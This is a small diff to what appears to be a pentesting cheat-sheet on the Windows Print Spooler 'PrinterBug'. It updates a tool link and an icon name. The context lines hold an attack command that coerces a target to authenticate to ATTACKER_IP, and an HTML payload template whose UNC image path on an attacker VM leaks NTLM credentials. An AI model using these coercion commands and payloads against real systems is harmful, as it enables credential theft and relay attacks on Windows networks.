@@ -6,7 +6,7 @@ Simple tool to trigger SpoolService bug via RPC backconnect. Similar to dementor
 `# python3 printerbug.py domain/USER:password@target.domain.local ATTACKER_IP`   
  
 ### Using SpoolSample
-The Printerbug can also be triggered from Windows using the "SpoolSample" tool: https://ci.appveyor.com/project/CompassSecurity/spoolsample   
+The Printerbug can also be triggered from Windows using the "SpoolSample" tool: https://github.com/leechristensen/SpoolSample   
 
 **Check Spooler Remotely**   
 To check if the spooler is active on the remote target, there are different methods:   
@@ -29,7 +29,7 @@ Payload template
 ```
 <html>
 <body>
-<img src="\\<ATTACKER VM>\compass.ico" height="1" width="1" />
+<img src="\\<ATTACKER VM>\someicon.ico" height="1" width="1" />
 </body>
 </html>
 ```
